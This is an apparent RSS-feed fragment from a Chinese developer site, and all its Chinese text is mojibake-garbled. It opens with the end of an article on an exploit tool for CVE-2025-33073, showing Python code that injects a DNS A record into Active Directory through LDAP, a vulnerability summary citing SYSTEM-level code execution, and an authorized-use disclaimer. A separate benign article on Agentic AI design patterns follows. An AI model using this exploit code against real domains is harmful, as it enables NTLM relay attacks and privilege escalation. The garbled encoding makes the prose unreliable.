    <span class="hljs-comment"># åˆ›å»ºdnsNodeå¯¹è±¡å¹¶è®¾ç½®å±æ€§</span>
    dns_record = ldaptypes.DNS_RECORD()
    dns_record[<span class="hljs-string">'Data'</span>] = record_data
    dns_record[<span class="hljs-string">'Type'</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># Aè®°å½•ç±»å‹</span>
    
    <span class="hljs-comment"># å‡†å¤‡è¦æ·»åŠ çš„å±æ€§</span>
    attributes = {
        <span class="hljs-string">'objectClass'</span>: [<span class="hljs-string">'top'</span>, <span class="hljs-string">'dnsNode'</span>],
        <span class="hljs-string">'dnsRecord'</span>: [dns_record.getData()],
        <span class="hljs-string">'dNSTombstoned'</span>: <span class="hljs-literal">False</span>
    }
    
    <span class="hljs-comment"># æ‰§è¡ŒLDAPæ·»åŠ æ“ä½œ</span>
    connection.add(container, attributes=attributes)
    print_o(<span class="hljs-string">f"Successfully added record <span class="hljs-subst">{record_name}</span>"</span>)
</code></pre>
<h4 data-id="heading-17">æ¼æ´å…³é”®ä¿¡æ¯ï¼ˆCVE-2025-33073ï¼‰</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## æ¼æ´è¯¦æƒ…</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**CVE ID**</span>: CVE-2025-33073
<span class="hljs-bullet">-</span> <span class="hljs-strong">**CVSSè¯„åˆ†**</span>: 8.8 (High)
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å½±å“èŒƒå›´**</span>: Windows 10, 11, Server 2012â€“2025
<span class="hljs-bullet">-</span> <span class="hljs-strong">**æ”»å‡»å‘é‡**</span>: ç½‘ç»œï¼ˆéœ€èº«ä»½éªŒè¯ï¼‰
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å½±å“**</span>: SYSTEMçº§åˆ«ä»£ç æ‰§è¡Œ
<span class="hljs-bullet">-</span> <span class="hljs-strong">**å…³é”®ç‰¹æ€§**</span>: ç»•è¿‡NTLMåå°„ç¼“è§£æªæ–½
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šæœ¬å·¥å…·ä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•ã€æ•™è‚²å’Œç ”ç©¶ç›®çš„ã€‚æœªç»æˆæƒå¯¹ä»–äººç³»ç»Ÿè¿›è¡Œæµ‹è¯•æ˜¯éæ³•çš„ã€‚
6HFtX5dABrKlqXeO5PUv/ydjQZDJ7Ct83xG1NG8fcAOCkEtiS8C/LxH9i/qwckdE</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡]]></title>    <link>https://juejin.cn/post/7592524811860525090</link>    <guid>https://juejin.cn/post/7592524811860525090</guid>    <pubDate>2026-01-08T01:58:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592524811860525090" data-draft-id="7592483877986648070" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡"/> <meta itemprop="keywords" content="Agent,AIç¼–ç¨‹,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-08T01:58:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FreeCode"/> <meta itemprop="url" content="https://juejin.cn/user/1282499717900794"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ–‡ç²¾é€šAgentic AIè®¾è®¡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1282499717900794/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FreeCode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:58:31.000Z" title="Thu Jan 08 2026 01:58:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»13åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><p>åœ¨åŸºäºå¤§æ¨¡å‹çš„AIåº”ç”¨è®¾è®¡ä¸Šï¼Œå­˜åœ¨ç€ä¸¤ç§ä¸åŒçš„æ¨¡å¼ï¼šæ™ºèƒ½ä½“(Agent)å’Œå·¥ä½œæµ(WorkFlow)ã€‚ä¸šç•ŒæŠŠæ™ºèƒ½ä½“å’Œå·¥ä½œæµä»¥åŠå®ƒä»¬çš„æ··åˆä½“ç»Ÿç§°ä¸ºAgentic AIã€‚è®¾è®¡Agentic AIç³»ç»Ÿçš„åŸºç¡€å°±æ˜¯è®¾è®¡æ™ºèƒ½ä½“å’Œå·¥ä½œæµã€‚æœ¬æ–‡å¸¦æ‚¨å¿«é€Ÿäº†è§£æ™ºèƒ½ä½“å’Œå·¥ä½œæµçš„åŸºç¡€è®¾è®¡æ¨¡å¼ï¼ŒæŒæ¡Agentic AIè®¾è®¡çš„æ ¸å¿ƒåŸåˆ™ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€æ™ºèƒ½ä½“åŸºç¡€è®¾è®¡æ¨¡å¼</h2>
<p>æ™ºèƒ½ä½“è®¾è®¡æ¨¡å¼ä½¿æ™ºèƒ½ä½“èƒ½å¤Ÿå®ç°åŠ¨æ€é€‚åº”ã€è§„åˆ’ä¸åä½œï¼Œç¡®ä¿ç³»ç»Ÿå¯ç²¾å‡†ä¸”é«˜æ•ˆåœ°å¤„ç†å¤æ‚çš„ç°å®ä»»åŠ¡ã€‚æ™ºèƒ½ä½“æœ‰å››å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼š</p>
<h3 data-id="heading-1">1ã€åæ€ï¼ˆReflectionï¼‰</h3>
<p>åæ€æ¨¡å¼æ˜¯æ™ºèƒ½ä½“çš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œèƒ½å¤Ÿä½¿æ™ºèƒ½ä½“å¯¹å…¶è¾“å‡ºç»“æœè¿›è¡Œè¿­ä»£å¼è¯„ä¼°ä¸ä¼˜åŒ–ã€‚é€šè¿‡èå…¥è‡ªæˆ‘åæ€æ¨¡å¼ï¼Œæ™ºèƒ½ä½“å¯è¯†åˆ«å¹¶ä¿®æ­£é”™è¯¯ã€çŸ›ç›¾ä¹‹å¤„ä»¥åŠå¾…æ”¹è¿›çš„ç¯èŠ‚ï¼Œä»è€Œåœ¨ä»£ç ç”Ÿæˆã€æ–‡æœ¬åˆ›ä½œã€é—®ç­”ç­‰å„ç±»ä»»åŠ¡ä¸­æå‡æ‰§è¡Œæ€§èƒ½ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œåæ€æ¨¡å¼çš„å…·ä½“æµç¨‹æ˜¯ï¼šå…ˆä¿ƒä½¿æ™ºèƒ½ä½“ä»æ­£ç¡®æ€§ã€é£æ ¼ä¸æ•ˆç‡ä¸‰ä¸ªç»´åº¦å¯¹è‡ªèº«è¾“å‡ºç»“æœè¿›è¡Œè¯„åˆ¤ï¼Œå†å°†è¯„åˆ¤æ‰€å¾—çš„åé¦ˆä¿¡æ¯èå…¥åç»­çš„è¿­ä»£ä¼˜åŒ–è¿‡ç¨‹ã€‚å•å…ƒæµ‹è¯•ã€ç½‘ç»œæœç´¢ç­‰å¤–éƒ¨å·¥å…·å¯è¿›ä¸€æ­¥å¼ºåŒ–è¿™ä¸€æµç¨‹ â€”â€” å®ƒä»¬æ—¢èƒ½éªŒè¯è¾“å‡ºç»“æœçš„æœ‰æ•ˆæ€§ï¼Œåˆèƒ½å‡¸æ˜¾å…¶ä¸­å­˜åœ¨çš„ä¿¡æ¯ç¼ºå£ã€‚</p>
<p>åœ¨å¤šæ™ºèƒ½ä½“ç³»ç»Ÿä¸­ï¼Œåæ€æ¨¡å¼å¯é€šè¿‡è§’è‰²åˆ†å·¥çš„æ–¹å¼å®ç°ï¼šä¾‹å¦‚ç”±ä¸€ä¸ªæ™ºèƒ½ä½“è´Ÿè´£ç”Ÿæˆè¾“å‡ºå†…å®¹ï¼Œå¦ä¸€ä¸ªæ™ºèƒ½ä½“ä¸“é—¨è¿›è¡Œè¯„åˆ¤ï¼Œä»¥æ­¤æ¨åŠ¨åä½œå¼ä¼˜åŒ–ã€‚ä»¥æ³•å¾‹ç ”ç©¶åœºæ™¯ä¸ºä¾‹ï¼Œæ™ºèƒ½ä½“å¯é€šè¿‡é‡æ–°è¯„ä¼°æ£€ç´¢åˆ°çš„åˆ¤ä¾‹æ³•ï¼Œå¯¹è¾“å‡ºçš„å›å¤å†…å®¹è¿›è¡Œè¿­ä»£ä¼˜åŒ–ï¼Œä»è€Œç¡®ä¿å›å¤çš„å‡†ç¡®æ€§ä¸å…¨é¢æ€§ã€‚åœ¨ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2303.17651" target="_blank" title="https://arxiv.org/pdf/2303.17651" ref="nofollow noopener noreferrer">Self-Refine</a>ã€‹ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2303.11366" target="_blank" title="https://arxiv.org/pdf/2303.11366" ref="nofollow noopener noreferrer">Reflexion</a>ã€‹ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fpdf%2F2305.11738" target="_blank" title="https://arxiv.org/pdf/2305.11738" ref="nofollow noopener noreferrer">CRITIC</a>ã€‹ç­‰ç›¸å…³ç ”ç©¶ä¸­ï¼Œåæ€æ¨¡å¼å·²è¢«è¯å®èƒ½æ˜¾è‘—æå‡æ™ºèƒ½ä½“çš„ä»»åŠ¡æ‰§è¡Œæ€§èƒ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4f0ed4a19504f64abac130d9dd674ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=SZKtT4JcGFP5E0n5dYQeCOFyVYM%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>æ”¯æŒå¯¹ç»“æœè¿›è¡Œè¿­ä»£ä¼˜åŒ–ã€‚</li>
<li>æå‡å¤šæ­¥æ¨ç†ä»»åŠ¡çš„å‡†ç¡®æ€§ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åœ¨åŒ»ç–—è¯Šæ–­ç³»ç»Ÿä¸­ï¼Œæ™ºèƒ½ä½“åŸºäºæ£€ç´¢æ•°æ®çš„è¿­ä»£åé¦ˆï¼ŒæŒç»­ä¼˜åŒ–è¯Šæ–­ç»“è®ºã€‚</li>
</ul>
<h3 data-id="heading-2">2ã€è§„åˆ’ï¼ˆPlanningï¼‰</h3>
<p>è§„åˆ’æ¨¡å¼æ˜¯æ™ºèƒ½ä½“çš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œå®ƒèƒ½è®©æ™ºèƒ½ä½“å°†å¤æ‚ä»»åŠ¡è‡ªä¸»æ‹†è§£ä¸ºæ›´å°çš„ã€å¯å¤„ç†çš„å­ä»»åŠ¡ã€‚è¿™ç§èƒ½åŠ›å¯¹äºåŠ¨æ€ã€ä¸ç¡®å®šåœºæ™¯ä¸‹çš„å¤šæ­¥æ¨ç†ä¸è¿­ä»£å¼é—®é¢˜æ±‚è§£è‡³å…³é‡è¦ã€‚å€ŸåŠ©è§„åˆ’æ¨¡å¼ï¼Œæ™ºèƒ½ä½“å¯åŠ¨æ€ç¡®å®šå®Œæˆå¤§å‹ç›®æ ‡æ‰€éœ€çš„æ­¥éª¤åºåˆ—ã€‚è¿™ç§é€‚åº”æ€§ä½¿æ™ºèƒ½ä½“èƒ½å¤Ÿå¤„ç†æ— æ³•é¢„å…ˆå®šä¹‰çš„ä»»åŠ¡ï¼Œä¿éšœå†³ç­–è¿‡ç¨‹çš„çµæ´»æ€§ã€‚</p>
<p>å°½ç®¡è§„åˆ’æ¨¡å¼åŠŸèƒ½å¼ºå¤§ï¼Œä½†ä¸åæ€æ¨¡å¼è¿™ç±»ç¡®å®šæ€§å·¥ä½œæµç›¸æ¯”ï¼Œå…¶äº§å‡ºç»“æœçš„å¯é¢„æµ‹æ€§ç›¸å¯¹è¾ƒä½ã€‚è¯¥æ¨¡å¼ç‰¹åˆ«é€‚ç”¨äºéœ€è¦åŠ¨æ€é€‚é…ã€ä¸”é¢„å®šä¹‰å·¥ä½œæµéš¾ä»¥æ»¡è¶³éœ€æ±‚çš„ä»»åŠ¡åœºæ™¯ã€‚éšç€æŠ€æœ¯æ—¥è¶‹æˆç†Ÿï¼Œå®ƒåœ¨å„é¢†åŸŸæ¨åŠ¨åˆ›æ–°åº”ç”¨çš„æ½œåŠ›å°†æŒç»­é‡Šæ”¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49930879c5ed408aa41e5e9a6d8b07f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=Hy7v4OdHyO3p%2Fx4inNTlheihIW8%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>é€šè¿‡ä»»åŠ¡æ‹†è§£ï¼Œä¸ºå¤šæ­¥æ¨ç†æä¾›æ”¯æ’‘ã€‚</li>
<li>åŸºäºä¼˜åŒ–çš„ä»»åŠ¡ä¼˜å…ˆçº§æ’åºï¼Œé™ä½è®¡ç®—å¼€é”€ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>æŸè´¢åŠ¡åˆ†æç³»ç»Ÿé€šè¿‡è§„åˆ’æ•°æ®æ£€ç´¢ä»»åŠ¡ï¼Œå¼€å±•é£é™©è¯„ä¼°å¹¶ç»™å‡ºå†³ç­–å»ºè®®ã€‚</li>
</ul>
<h3 data-id="heading-3">3ã€å·¥å…·è°ƒç”¨ï¼ˆTool Useï¼‰</h3>
<p>å·¥å…·è°ƒç”¨æ¨¡å¼æŒ‡æ™ºèƒ½ä½“é€šè¿‡ä¸å¤–éƒ¨å·¥å…·ã€åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰æˆ–è®¡ç®—èµ„æºäº¤äº’ï¼Œæ‹“å±•è‡ªèº«èƒ½åŠ›èŒƒå›´ã€‚è¯¥æ¨¡å¼ä½¿æ™ºèƒ½ä½“å¾—ä»¥çªç ´é¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œå®Œæˆä¿¡æ¯æ”¶é›†ã€è®¡ç®—æ‰§è¡Œä¸æ•°æ®å¤„ç†ç­‰ä»»åŠ¡ã€‚é€šè¿‡å°†å·¥å…·åŠ¨æ€æ•´åˆè‡³å·¥ä½œæµä¸­ï¼Œæ™ºèƒ½ä½“èƒ½å¤Ÿé€‚é…å¤æ‚ä»»åŠ¡åœºæ™¯ï¼Œè¾“å‡ºæ›´ç²¾å‡†ä¸”è´´åˆä¸Šä¸‹æ–‡çš„ç»“æœã€‚</p>
<p>åœ¨ç°ä»£æ™ºèƒ½ä½“ä¸­ï¼Œå·¥å…·è°ƒç”¨æ¨¡å¼è¢«å¹¿æ³›åº”ç”¨äºå„ç±»åœºæ™¯ï¼Œæ¶µç›–ä¿¡æ¯æ£€ç´¢ã€è®¡ç®—æ¨ç†ä»¥åŠä¸å¤–éƒ¨ç³»ç»Ÿçš„å¯¹æ¥äº¤äº’ã€‚éšç€å¤§æ¨¡å‹å·¥å…·è°ƒç”¨åŠŸèƒ½çš„è½åœ°ï¼Œä»¥åŠæ”¯æŒå¤šå·¥å…·è°ƒç”¨ç®¡ç†çš„ç³»ç»Ÿé€æ­¥æˆç†Ÿï¼Œè¯¥æ¨¡å¼çš„æŠ€æœ¯å®ç°å·²å–å¾—æ˜¾è‘—å‘å±•ã€‚è¿™äº›æŠ€æœ¯è¿›æ­¥æ¨åŠ¨äº†æ›´å¤æ‚æ™ºèƒ½ä½“çš„è½åœ° â€”â€” æ™ºèƒ½ä½“å¯é’ˆå¯¹ç‰¹å®šä»»åŠ¡è‡ªä¸»ç­›é€‰å¹¶æ‰§è¡Œæœ€é€‚é…çš„å·¥å…·ã€‚å°½ç®¡å·¥å…·è°ƒç”¨æ¨¡å¼å¤§å¹…æå‡äº†æ™ºèƒ½ä½“çš„æ•ˆèƒ½ï¼Œä½†åœ¨å·¥å…·ç­›é€‰ä¼˜åŒ–æ–¹é¢ä»å­˜åœ¨æŒ‘æˆ˜ï¼Œå°¤å…¶æ˜¯åœ¨å·¥å…·é€‰é¡¹ç¹å¤šçš„åœºæ™¯ä¸‹ã€‚ç›®å‰å·²æœ‰ç ”ç©¶æå‡ºå€Ÿé‰´æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰æŠ€æœ¯çš„è§£å†³æ–¹æ¡ˆï¼Œä¾‹å¦‚åŸºäºå¯å‘å¼è§„åˆ™çš„å·¥å…·ç­›é€‰æ–¹æ³•ï¼Œä»¥åº”å¯¹è¿™ä¸€éš¾é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bad1ccab8d0d486db7c77f91f8e6de25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=phoLYceoJ2PF9TshQjNoUCZ87Ic%3D" alt="image.png" loading="lazy"/></p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>çªç ´ç³»ç»Ÿé¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œæ‹“å±•åŠŸèƒ½è¾¹ç•Œã€‚</li>
<li>æ•´åˆå¤–éƒ¨èµ„æºï¼Œèµ‹èƒ½ç‰¹å®šé¢†åŸŸçš„åº”ç”¨è½åœ°ã€‚</li>
</ul>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>ä¸€æ¬¾æ³•å¾‹è¾…åŠ©æ™ºèƒ½ä½“ä»åˆåŒæ•°æ®åº“ä¸­æ£€ç´¢ç›¸å…³æ¡æ¬¾ï¼Œå¹¶è¿ç”¨ç‰¹å®šé¢†åŸŸçš„è§„åˆ™å¼€å±•åˆè§„æ€§åˆ†æã€‚</li>
</ul>
<h3 data-id="heading-4">4ã€å¤šæ™ºèƒ½ä½“åä½œï¼ˆMulti-agent Collaborationï¼‰</h3>
<p>å¤šæ™ºèƒ½ä½“åä½œæ˜¯æ™ºèƒ½ä½“ç³»ç»Ÿçš„ä¸€é¡¹åŸºç¡€è®¾è®¡æ¨¡å¼ï¼Œèƒ½å¤Ÿå®ç°ä»»åŠ¡ä¸“ä¸šåŒ–åˆ†å·¥ä¸å¹¶è¡Œå¤„ç†ã€‚å„æ™ºèƒ½ä½“ä¹‹é—´é€šè¿‡é€šä¿¡å…±äº«ä¸­é—´ç»“æœï¼Œç¡®ä¿æ•´ä½“å·¥ä½œæµå§‹ç»ˆé«˜æ•ˆä¸”é€»è¾‘è¿è´¯ã€‚é€šè¿‡å°†å­ä»»åŠ¡åˆ†é…ç»™ä¸åŒçš„ä¸“ä¸šæ™ºèƒ½ä½“ï¼Œè¯¥æ¨¡å¼å¤§å¹…æå‡äº†å¤æ‚æ™ºèƒ½ä½“ç³»ç»Ÿçš„å¯æ‰©å±•æ€§ä¸é€‚åº”æ€§ã€‚å¤šæ™ºèƒ½ä½“ç³»ç»Ÿå…è®¸å¼€å‘è€…å°†å¤æ‚ä»»åŠ¡æ‹†è§£ä¸ºæ›´å°çš„å¯å¤„ç†å­ä»»åŠ¡ï¼Œå¹¶åˆ†é…ç»™ä¸åŒæ™ºèƒ½ä½“æ‰§è¡Œã€‚è¿™ç§æ–¹å¼ä¸ä»…èƒ½æå‡ä»»åŠ¡æ‰§è¡Œæ€§èƒ½ï¼Œè¿˜èƒ½ä¸ºç®¡ç†å¤æ‚äº¤äº’æä¾›ä¸€ä¸ªç¨³å¥çš„æ¡†æ¶ã€‚æ¯ä¸ªæ™ºèƒ½ä½“éƒ½æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜ç©ºé—´ä¸å·¥ä½œæµï¼Œå…¶å·¥ä½œæµå¯æ¶µç›–å·¥å…·è°ƒç”¨ã€åæ€æˆ–è§„åˆ’æ¨¡å¼ç­‰èƒ½åŠ›æ¨¡å—ï¼Œè¿›è€Œå®ç°åŠ¨æ€åä½œå¼é—®é¢˜æ±‚è§£ã€‚</p>
<p>å°½ç®¡å¤šæ™ºèƒ½ä½“åä½œå…·å¤‡å·¨å¤§æ½œåŠ›ï¼Œä½†ç›¸è¾ƒäºåæ€æ¨¡å¼ã€å·¥å…·è°ƒç”¨ç­‰æ›´ä¸ºæˆç†Ÿçš„æ¨¡å¼ï¼Œè¯¥è®¾è®¡æ¨¡å¼çš„ç»“æœå¯é¢„æµ‹æ€§ç›¸å¯¹è¾ƒä½ã€‚ä¸è¿‡ï¼ŒAutoGenã€Crew AIã€LangGraph ç­‰æ–°å…´æ¡†æ¶çš„å‡ºç°ï¼Œæ­£ä¸ºè½åœ°é«˜æ•ˆçš„å¤šæ™ºèƒ½ä½“è§£å†³æ–¹æ¡ˆå¼€è¾Ÿæ–°è·¯å¾„ã€‚</p>
